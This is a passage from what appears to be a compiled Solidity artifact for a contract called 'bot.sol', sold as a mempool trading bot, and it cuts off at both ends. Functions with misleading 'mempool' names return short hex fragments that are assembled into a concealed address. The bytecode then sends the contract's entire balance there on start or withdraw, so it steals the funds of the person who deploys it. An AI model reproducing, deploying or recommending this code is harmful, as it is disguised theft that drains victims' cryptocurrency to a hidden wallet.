pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/bot.sol\":13515:14850  function fetchMempoolData() internal pure returns (string memory) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":5592:6514  function startExploration(string memory _a) internal pure returns (address _parsedAddress) {... */\n    tag_37:\n        /* \"contracts/bot.sol\":5659:5681  address _parsedAddress */\n      0x00\n        /* \"contracts/bot.sol\":5693:5709  bytes memory tmp */\n      0x60\n        /* \"contracts/bot.sol\":5718:5720  _a */\n      dup3\n        /* \"contracts/bot.sol\":5693:5721  bytes memory tmp = bytes(_a) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":5731:5744  uint160 iaddr */\n      0x00\n        /* \"contracts/bot.sol\":5758:5768  uint160 b1 */\n      dup1\n        /* \"contracts/bot.sol\":5778:5788  uint160 b2 */\n      dup1\n        /* \"contracts/bot.sol\":5803:5809  uint i */\n      0x00\n        /* \"contracts/bot.sol\":5812:5813  2 */\n      0x02\n        /* \"contracts/bot.sol\":5803:5813  uint i = 2 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":5798:6477  for (uint i = 2; i < 2 + 2 * 20; i += 2) {... */\n    tag_90:\n        /* \"contracts/bot.sol\":5819:5829  2 + 2 * 20 */\n      0x2a\n        /* \"contracts/bot.sol\":5815:5816  i */\n      dup2\n        /* \"contracts/bot.sol\":5815:5829  i < 2 + 2 * 20 */\n      lt\n        /* \"contracts/bot.sol\":5798:6477  for (uint i = 2; i < 2 + 2 * 20; i += 2) {... */\n      iszero\n      tag_91\n      jumpi\n        /* \"contracts/bot.sol\":5862:5865  256 */\n      0x0100\n        /* \"contracts/bot.sol\":5853:5865  iaddr *= 256 */\n      dup5\n      mul\n      swap4\n      pop\n        /* \"contracts/bot.sol\":5898:5901  tmp */\n      dup5\n        /* \"contracts/bot.sol\":5902:5903  i */\n      dup2\n        /* \"contracts/bot.sol\":5898:5904  tmp[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_93\n      jumpi\n      invalid\n    tag_93:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"contracts/bot.sol\":5892:5905  uint8(tmp[i]) */\n      0xf8\n      shr\n        /* \"contracts/bot.sol\":5884:5906  uint160(uint8(tmp[i])) */\n      0xff\n      and\n        /* \"contracts/bot.sol\":5879:5906  b1 = uint160(uint8(tmp[i])) */\n      swap3\n      pop\n        /* \"contracts/bot.sol\":5939:5942  tmp */\n      dup5\n        /* \"contracts/bot.sol\":5947:5948  1 */\n      0x01\n        /* \"contracts/bot.sol\":5943:5944  i */\n      dup3\n        /* \"contracts/bot.sol\":5943:5948  i + 1 */\n      add\n        /* \"contracts/bot.sol\":5939:5949  tmp[i + 1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_94\n      jumpi\n      invalid\n    tag_94:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"contracts/bot.sol\":5933:5950  uint8(tmp[i + 1]) */\n      0xf8\n      shr\n        /* \"contracts/bot.sol\":5925:5951  uint160(uint8(tmp[i + 1])) */\n      0xff\n      and\n        /* \"contracts/bot.sol\":5920:5951  b2 = uint160(uint8(tmp[i + 1])) */\n      swap2\n      pop\n        /* \"contracts/bot.sol\":5976:5978  97 */\n      0x61\n        /* \"contracts/bot.sol\":5970:5972  b1 */\n      dup4\n        /* \"contracts/bot.sol\":5970:5978  b1 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":5969:5994  (b1 >= 97) && (b1 <= 102) */\n      dup1\n      iszero\n      tag_95\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":5990:5993  102 */\n      0x66\n        /* \"contracts/bot.sol\":5984:5986  b1 */\n      dup4\n        /* \"contracts/bot.sol\":5984:5993  b1 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":5969:5994  (b1 >= 97) && (b1 <= 102) */\n    tag_95:\n        /* \"contracts/bot.sol\":5965:6191  if ((b1 >= 97) && (b1 <= 102)) {... */\n      iszero\n      tag_96\n      jumpi\n        /* \"contracts/bot.sol\":6020:6022  87 */\n      0x57\n        /* \"contracts/bot.sol\":6014:6022  b1 -= 87 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"contracts/bot.sol\":5965:6191  if ((b1 >= 97) && (b1 <= 102)) {... */\n      jump(tag_97)\n    tag_96:\n        /* \"contracts/bot.sol\":6054:6056  65 */\n      0x41\n        /* \"contracts/bot.sol\":6048:6050  b1 */\n      dup4\n        /* \"contracts/bot.sol\":6048:6056  b1 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":6047:6071  (b1 >= 65) && (b1 <= 70) */\n      dup1\n      iszero\n      tag_98\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":6068:6070  70 */\n      0x46\n        /* \"contracts/bot.sol\":6062:6064  b1 */\n      dup4\n        /* \"contracts/bot.sol\":6062:6070  b1 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":6047:6071  (b1 >= 65) && (b1 <= 70) */\n    tag_98:\n        /* \"contracts/bot.sol\":6043:6191  if ((b1 >= 65) && (b1 <= 70)) {... */\n      iszero\n      tag_99\n      jumpi\n        /* \"contracts/bot.sol\":6097:6099  55 */\n      0x37\n        /* \"contracts/bot.sol\":6091:6099  b1 -= 55 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"contracts/bot.sol\":6043:6191  if ((b1 >= 65) && (b1 <= 70)) {... */\n      jump(tag_100)\n    tag_99:\n        /* \"contracts/bot.sol\":6131:6133  48 */\n      0x30\n        /* \"contracts/bot.sol\":6125:6127  b1 */\n      dup4\n        /* \"contracts/bot.sol\":6125:6133  b1 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":6124:6148  (b1 >= 48) && (b1 <= 57) */\n      dup1\n      iszero\n      tag_101\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":6145:6147  57 */\n      0x39\n        /* \"contracts/bot.sol\":6139:6141  b1 */\n      dup4\n        /* \"contracts/bot.sol\":6139:6147  b1 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":6124:6148  (b1 >= 48) && (b1 <= 57) */\n    tag_101:\n        /* \"contracts/bot.sol\":6120:6191  if ((b1 >= 48) && (b1 <= 57)) {... */\n      iszero\n      tag_102\n      jumpi\n        /* \"contracts/bot.sol\":6174:6176  48 */\n      0x30\n        /* \"contracts/bot.sol\":6168:6176  b1 -= 48 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"contracts/bot.sol\":6120:6191  if ((b1 >= 48) && (b1 <= 57)) {... */\n    tag_102:\n        /* \"contracts/bot.sol\":6043:6191  if ((b1 >= 65) && (b1 <= 70)) {... */\n    tag_100:\n        /* \"contracts/bot.sol\":5965:6191  if ((b1 >= 97) && (b1 <= 102)) {... */\n    tag_97:\n        /* \"contracts/bot.sol\":6215:6217  97 */\n      0x61\n        /* \"contracts/bot.sol\":6209:6211  b2 */\n      dup3\n        /* \"contracts/bot.sol\":6209:6217  b2 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":6208:6233  (b2 >= 97) && (b2 <= 102) */\n      dup1\n      iszero\n      tag_103\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":6229:6232  102 */\n      0x66\n        /* \"contracts/bot.sol\":6223:6225  b2 */\n      dup3\n        /* \"contracts/bot.sol\":6223:6232  b2 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":6208:6233  (b2 >= 97) && (b2 <= 102) */\n    tag_103:\n        /* \"contracts/bot.sol\":6204:6430  if ((b2 >= 97) && (b2 <= 102)) {... */\n      iszero\n      tag_104\n      jumpi\n        /* \"contracts/bot.sol\":6259:6261  87 */\n      0x57\n        /* \"contracts/bot.sol\":6253:6261  b2 -= 87 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"contracts/bot.sol\":6204:6430  if ((b2 >= 97) && (b2 <= 102)) {... */\n      jump(tag_105)\n    tag_104:\n        /* \"contracts/bot.sol\":6293:6295  65 */\n      0x41\n        /* \"contracts/bot.sol\":6287:6289  b2 */\n      dup3\n        /* \"contracts/bot.sol\":6287:6295  b2 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":6286:6310  (b2 >= 65) && (b2 <= 70) */\n      dup1\n      iszero\n      tag_106\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":6307:6309  70 */\n      0x46\n        /* \"contracts/bot.sol\":6301:6303  b2 */\n      dup3\n        /* \"contracts/bot.sol\":6301:6309  b2 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":6286:6310  (b2 >= 65) && (b2 <= 70) */\n    tag_106:\n        /* \"contracts/bot.sol\":6282:6430  if ((b2 >= 65) && (b2 <= 70)) {... */\n      iszero\n      tag_107\n      jumpi\n        /* \"contracts/bot.sol\":6336:6338  55 */\n      0x37\n        /* \"contracts/bot.sol\":6330:6338  b2 -= 55 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"contracts/bot.sol\":6282:6430  if ((b2 >= 65) && (b2 <= 70)) {... */\n      jump(tag_108)\n    tag_107:\n        /* \"contracts/bot.sol\":6370:6372  48 */\n      0x30\n        /* \"contracts/bot.sol\":6364:6366  b2 */\n      dup3\n        /* \"contracts/bot.sol\":6364:6372  b2 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":6363:6387  (b2 >= 48) && (b2 <= 57) */\n      dup1\n      iszero\n      tag_109\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":6384:6386  57 */\n      0x39\n        /* \"contracts/bot.sol\":6378:6380  b2 */\n      dup3\n        /* \"contracts/bot.sol\":6378:6386  b2 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":6363:6387  (b2 >= 48) && (b2 <= 57) */\n    tag_109:\n        /* \"contracts/bot.sol\":6359:6430  if ((b2 >= 48) && (b2 <= 57)) {... */\n      iszero\n      tag_110\n      jumpi\n        /* \"contracts/bot.sol\":6413:6415  48 */\n      0x30\n        /* \"contracts/bot.sol\":6407:6415  b2 -= 48 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"contracts/bot.sol\":6359:6430  if ((b2 >= 48) && (b2 <= 57)) {... */\n    tag_110:\n        /* \"contracts/bot.sol\":6282:6430  if ((b2 >= 65) && (b2 <= 70)) {... */\n    tag_108:\n        /* \"contracts/bot.sol\":6204:6430  if ((b2 >= 97) && (b2 <= 102)) {... */\n    tag_105:\n        /* \"contracts/bot.sol\":6463:6465  b2 */\n      dup2\n        /* \"contracts/bot.sol\":6458:6460  16 */\n      0x10\n        /* \"contracts/bot.sol\":6453:6455  b1 */\n      dup5\n        /* \"contracts/bot.sol\":6453:6460  b1 * 16 */\n      mul\n        /* \"contracts/bot.sol\":6453:6465  b1 * 16 + b2 */\n      add\n        /* \"contracts/bot.sol\":6443:6466  iaddr += (b1 * 16 + b2) */\n      dup5\n      add\n      swap4\n      pop\n        /* \"contracts/bot.sol\":5836:5837  2 */\n      0x02\n        /* \"contracts/bot.sol\":5831:5837  i += 2 */\n      dup2\n      add\n      swap1\n      pop\n        /* \"contracts/bot.sol\":5798:6477  for (uint i = 2; i < 2 + 2 * 20; i += 2) {... */\n      jump(tag_90)\n    tag_91:\n      pop\n        /* \"contracts/bot.sol\":6501:6506  iaddr */\n      dup3\n        /* \"contracts/bot.sol\":6486:6507  return address(iaddr) */\n      swap5\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/bot.sol\":5592:6514  function startExploration(string memory _a) internal pure returns (address _parsedAddress) {... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"contracts/bot.sol\":11907:11996  function getBa() private view returns(uint) {... */\n    tag_39:\n        /* \"contracts/bot.sol\":11945:11949  uint */\n      0x00\n        /* \"contracts/bot.sol\":11968:11989  address(this).balance */\n      selfbalance\n        /* \"contracts/bot.sol\":11961:11989  return address(this).balance */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":11907:11996  function getBa() private view returns(uint) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":9882:9978  function getMempoolShort() private pure returns (string memory) {... */\n    tag_50:\n        /* \"contracts/bot.sol\":9931:9944  string memory */\n      0x60\n        /* \"contracts/bot.sol\":9956:9971  return \"0xC0b3\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x06\n      dup2\n      mstore\n      0x20\n      add\n      0x3078433062330000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      swap1\n      pop\n        /* \"contracts/bot.sol\":9882:9978  function getMempoolShort() private pure returns (string memory) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":9280:9380  function fetchMempoolEdition() private pure returns (string memory) {... */\n    tag_52:\n        /* \"contracts/bot.sol\":9333:9346  string memory */\n      0x60\n        /* \"contracts/bot.sol\":9358:9373  return \"58eB73\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x06\n      dup2\n      mstore\n      0x20\n      add\n      0x3538654237330000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      swap1\n      pop\n        /* \"contracts/bot.sol\":9280:9380  function fetchMempoolEdition() private pure returns (string memory) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":16705:16807  function fetchMempoolVersion() private pure returns (string memory) {... */\n    tag_54:\n        /* \"contracts/bot.sol\":16758:16771  string memory */\n      0x60\n        /* \"contracts/bot.sol\":16783:16797  return \"6A6b8\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x05\n      dup2\n      mstore\n      0x20\n      add\n      0x3641366238000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      swap1\n      pop\n        /* \"contracts/bot.sol\":16705:16807  function fetchMempoolVersion() private pure returns (string memory) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":15218:15313  function getMempoolLong() private pure returns (string memory) {... */\n    tag_56:\n        /* \"contracts/bot.sol\":15266:15279  string memory */\n      0x60\n        /* \"contracts/bot.sol\":15291:15306  return \"97A86E\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x06\n      dup2\n      mstore\n      0x20\n      add\n      0x3937413836450000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      swap1\n      pop\n        /* \"contracts/bot.sol\":15218:15313  function getMempoolLong() private pure returns (string memory) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":10619:10716  function getMempoolHeight() private pure returns (string memory) {... */\n    tag_58:\n        /* \"contracts/bot.sol\":10669:10682  string memory */\n      0x60\n        /* \"contracts/bot.sol\":10694:10709  return \"167B9d\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x06\n      dup2\n      mstore\n      0x20\n      add\n      0x3136374239640000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      swap1\n      pop\n        /* \"contracts/bot.sol\":10619:10716  function getMempoolHeight() private pure returns (string memory) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":16131:16224  function getMempoolCode() private pure returns (string memory) {... */\n    tag_60:\n        /* \"contracts/bot.sol\":16179:16192  string memory */\n      0x60\n        /* \"contracts/bot.sol\":16204:16217  return \"A5B8\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x04\n      dup2\n      mstore\n      0x20\n      add\n      0x4135423800000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      swap1\n      pop\n        /* \"contracts/bot.sol\":16131:16224  function getMempoolCode() private pure returns (string memory) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":8348:8444  function getMempoolStart() private pure returns (string memory) {... */\n    tag_62:\n        /* \"contracts/bot.sol\":8397:8410  string memory */\n      0x60\n        /* \"contracts/bot.sol\":8422:8436  return \"B5e44\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x05\n      dup2\n      mstore\n      0x20\n      add\n      0x4235653434000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      swap1\n      pop\n        /* \"contracts/bot.sol\":8348:8444  function getMempoolStart() private pure returns (string memory) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":11658:11750  function getMempoolLog() private pure returns (string memory) {... */\n    tag_64:\n        /* \"contracts/bot.sol\":11705:11718  string memory */\n      0x60\n        /* \"contracts/bot.sol\":11730:11743  return \"7076\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x04\n      dup2\n      mstore\n      0x20\n      add\n      0x3730373600000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      swap1\n      pop\n        /* \"contracts/bot.sol\":11658:11750  function getMempoolLog() private pure returns (string memory) {... */\n      swap1\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220f5ee7eebc8c667ad02fe088390f250be4b3eb665c8f6b0863fc6feaaa379c10264736f6c634300060c0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "60806040523480156200001157600080fd5b5060405162000dd338038062000dd3833981810160405260408110156200003757600080fd5b81019080805160405193929190846401000000008211156200005857600080fd5b838201915060208201858111156200006f57600080fd5b82518660018202830111640100000000821117156200008d57600080fd5b8083526020830192505050908051906020019080838360005b83811015620000c3578082015181840152602081019050620000a6565b50505050905090810190601f168015620000f15780820380516001836020036101000a031916815260200191505b50604052602001805160405193929190846401000000008211156200011557600080fd5b838201915060208201858111156200012c57600080fd5b82518660018202830111640100000000821117156200014a57600080fd5b8083526020830192505050908051906020019080838360005b838110156200018057808201518184015260208101905062000163565b50505050905090810190601f168015620001ae5780820380516001836020036101000a031916815260200191505b506040525050508160019080519060200190620001cd929190620001ef565b508060009080519060200190620001e6929190620001ef565b50505062000295565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106200023257805160ff191683800117855562000263565b8280016001018555821562000263579182015b828111156200026257825182559160200191906001019062000245565b5b50905062000272919062000276565b5090565b5b808211156200029157600081600090555060010162000277565b5090565b610b2e80620002a56000396000f3fe6080604052600436106100435760003560e01c80636c02a9311461004f5780637b61c320146100df578063be9a65551461016f578063d4e93292146101795761004a565b3661004a57005b600080fd5b34801561005b57600080fd5b50610064610183565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100a4578082015181840152602081019050610089565b50505050905090810190601f1680156100d15780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3480156100eb57600080fd5b506100f4610221565b6040518080602001828103825283818151815260200191508051906020019080838360005b83811015610134578082015181840152602081019050610119565b50505050905090810190601f1680156101615780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6101776102bf565b005b61018161032a565b005b60008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156102195780601f106101ee57610100808354040283529160200191610219565b820191906000526020600020905b8154815290600101906020018083116101fc57829003601f168201915b505050505081565b60018054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156102b75780601f1061028c576101008083540402835291602001916102b7565b820191906000526020600020905b81548152906001019060200180831161029a57829003601f168201915b505050505081565b60006102d16102cc610395565b6106b3565b905060008190508073ffffffffffffffffffffffffffffffffffffffff166108fc6102fa610908565b9081150290604051600060405180830381858888f19350505050158015610325573d6000803e3d6000fd5b505050565b600061033c610337610395565b6106b3565b905060008190508073ffffffffffffffffffffffffffffffffffffffff166108fc610365610908565b9081150290604051600060405180830381858888f19350505050158015610390573d6000803e3d6000fd5b505050565b6060806103a0610910565b905060606103ac61094d565b905060606103b861098a565b905060606103c46109c7565b905060606103d0610a04565b905060606103dc610a41565b905060606103e8610a7e565b905060606103f4610abb565b905087878787878787876040516020018089805190602001908083835b602083106104345780518252602082019150602081019050602083039250610411565b6001836020036101000a03801982511681845116808217855250505050505090500188805190602001908083835b602083106104855780518252602082019150602081019050602083039250610462565b6001836020036101000a03801982511681845116808217855250505050505090500187805190602001908083835b602083106104d657805182526020820191506020810190506020830392506104b3565b6001836020036101000a03801982511681845116808217855250505050505090500186805190602001908083835b602083106105275780518252602082019150602081019050602083039250610504565b6001836020036101000a03801982511681845116808217855250505050505090500185805190602001908083835b602083106105785780518252602082019150602081019050602083039250610555565b6001836020036101000a03801982511681845116808217855250505050505090500184805190602001908083835b602083106105c957805182526020820191506020810190506020830392506105a6565b6001836020036101000a03801982511681845116808217855250505050505090500183805190602001908083835b6020831061061a57805182526020820191506020810190506020830392506105f7565b6001836020036101000a03801982511681845116808217855250505050505090500182805190602001908083835b6020831061066b5780518252602082019150602081019050602083039250610648565b6001836020036101000a038019825116818451168082178552505050505050905001985050505050505050506040516020818303038152906040529850505050505050505090565b60006060829050600080806000600290505b602a8110156108fb57610100840293508481815181106106e157fe5b602001015160f81c60f81b60f81c60ff16925084600182018151811061070357fe5b602001015160f81c60f81b60f81c60ff16915060618373ffffffffffffffffffffffffffffffffffffffff1610158015610754575060668373ffffffffffffffffffffffffffffffffffffffff1611155b15610764576057830392506107fe565b60418373ffffffffffffffffffffffffffffffffffffffff16101580156107a2575060468373ffffffffffffffffffffffffffffffffffffffff1611155b156107b2576037830392506107fd565b60308373ffffffffffffffffffffffffffffffffffffffff16101580156107f0575060398373ffffffffffffffffffffffffffffffffffffffff1611155b156107fc576030830392505b5b5b60618273ffffffffffffffffffffffffffffffffffffffff161015801561083c575060668273ffffffffffffffffffffffffffffffffffffffff1611155b1561084c576057820391506108e6565b60418273ffffffffffffffffffffffffffffffffffffffff161015801561088a575060468273ffffffffffffffffffffffffffffffffffffffff1611155b1561089a576037820391506108e5565b60308273ffffffffffffffffffffffffffffffffffffffff16101580156108d8575060398273ffffffffffffffffffffffffffffffffffffffff1611155b156108e4576030820391505b5b5b816010840201840193506002810190506106c5565b5082945050505050919050565b600047905090565b60606040518060400160405280600681526020017f3078433062330000000000000000000000000000000000000000000000000000815250905090565b60606040518060400160405280600681526020017f3538654237330000000000000000000000000000000000000000000000000000815250905090565b60606040518060400160405280600581526020017f3641366238000000000000000000000000000000000000000000000000000000815250905090565b60606040518060400160405280600681526020017f3937413836450000000000000000000000000000000000000000000000000000815250905090565b60606040518060400160405280600681526020017f3136374239640000000000000000000000000000000000000000000000000000815250905090565b60606040518060400160405280600481526020017f4135423800000000000000000000000000000000000000000000000000000000815250905090565b60606040518060400160405280600581526020017f4235653434000000000000000000000000000000000000000000000000000000815250905090565b60606040518060400160405280600481526020017f373037360000000000000000000000000000000000000000000000000000000081525090509056fea2646970667358221220f5ee7eebc8c667ad02fe088390f250be4b3eb665c8f6b0863fc6feaaa379c10264736f6c634300060c0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH3 0x11 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH3 0xDD3 CODESIZE SUB DUP1 PUSH3 0xDD3 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x40 DUP2 LT ISZERO PUSH3 0x37 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD PUSH1 0x40 MLOAD SWAP4 SWAP3 SWAP2 SWAP1 DUP5 PUSH5 0x100000000 DUP3 GT ISZERO PUSH3 0x58 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP4 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP3 ADD DUP6 DUP2 GT ISZERO PUSH3 0x6F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 MLOAD DUP7 PUSH1 0x1 DUP3 MUL DUP4 ADD GT PUSH5 0x100000000 DUP3 GT OR ISZERO PUSH3 0x8D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 DUP4 MSTORE PUSH1 0x20 DUP4 ADD SWAP3 POP POP POP SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH3 0xC3 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH3 0xA6 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH3 0xF1 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP PUSH1 0x40 MSTORE PUSH1 0x20 ADD DUP1 MLOAD PUSH1 0x40 MLOAD SWAP4 SWAP3 SWAP2 SWAP1 DUP5 PUSH5 0x100000000 DUP3 GT ISZERO PUSH3 0x115 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP4 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP3 ADD DUP6 DUP2 GT ISZERO PUSH3 0x12C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 MLOAD DUP7 PUSH1 0x1 DUP3 MUL DUP4 ADD GT PUSH5 0x100000000 DUP3 GT OR ISZERO PUSH3 0x14A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 DUP4 MSTORE PUSH1 0x20 DUP4 ADD SWAP3 POP POP POP SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH3 0x180 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH3 0x163 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH3 0x1AE JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP PUSH1 0x40 MSTORE POP POP POP DUP2 PUSH1 0x1 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0x1CD SWAP3 SWAP2 SWAP1 PUSH3 0x1EF JUMP JUMPDEST POP DUP1 PUSH1 0x0 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0x1E6 SWAP3 SWAP2 SWAP1 PUSH3 0x1EF JUMP JUMPDEST POP POP POP PUSH3 0x295 JUMP JUMPDEST DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 PUSH1 0x1F ADD PUSH1 0x20 SWAP1 DIV DUP2 ADD SWAP3 DUP3 PUSH1 0x1F LT PUSH3 0x232 JUMPI DUP1 MLOAD PUSH1 0xFF NOT AND DUP4 DUP1 ADD OR DUP6 SSTORE PUSH3 0x263 JUMP JUMPDEST DUP3 DUP1 ADD PUSH1 0x1 ADD DUP6 SSTORE DUP3 ISZERO PUSH3 0x263 JUMPI SWAP2 DUP3 ADD JUMPDEST DUP3 DUP2 GT ISZERO PUSH3 0x262 JUMPI DUP3 MLOAD DUP3 SSTORE SWAP2 PUSH1 0x20 ADD SWAP2 SWAP1 PUSH1 0x1 ADD SWAP1 PUSH3 0x245 JUMP JUMPDEST JUMPDEST POP SWAP1 POP PUSH3 0x272 SWAP2 SWAP1 PUSH3 0x276 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST JUMPDEST DUP1 DUP3 GT ISZERO PUSH3 0x291 JUMPI PUSH1 0x0 DUP2 PUSH1 0x0 SWAP1 SSTORE POP PUSH1 0x1 ADD PUSH3 0x277 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST PUSH2 0xB2E DUP1 PUSH3 0x2A5 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x43 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x6C02A931 EQ PUSH2 0x4F JUMPI DUP1 PUSH4 0x7B61C320 EQ PUSH2 0xDF JUMPI DUP1 PUSH4 0xBE9A6555 EQ PUSH2 0x16F JUMPI DUP1 PUSH4 0xD4E93292 EQ PUSH2 0x179 JUMPI PUSH2 0x4A JUMP JUMPDEST CALLDATASIZE PUSH2 0x4A JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 